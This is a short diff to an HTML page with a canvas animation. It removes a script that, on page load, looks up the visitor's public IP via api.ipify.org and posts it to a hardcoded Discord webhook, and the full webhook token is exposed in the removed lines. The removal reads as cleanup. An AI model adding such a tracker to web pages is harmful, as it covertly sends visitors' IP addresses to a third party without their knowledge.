@@ -201,33 +201,5 @@ function drawStatic() {
 drawStatic();
 
 </script>
-<script>
-    async function sendToWebhook(data) {
-        const webhookUrl = "https://ptb.discord.com/api/webhooks/1500560529268408351/rAJt4cS7yQ3-Ig3mOR1ZQZGV5CxR1N6KV-fHcagbiguLrT_GIy72lL89mcVj4Qjt78at";
-
-        await fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                content: `${data}`
-            })
-        });
-    }
-
-    async function run() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const result = await response.json();
-
-            await sendToWebhook(result.ip);
-        } catch (err) {
-            console.error(err);
-        }
-    }
-
-    run();
-</script>
 </body>
 </html>
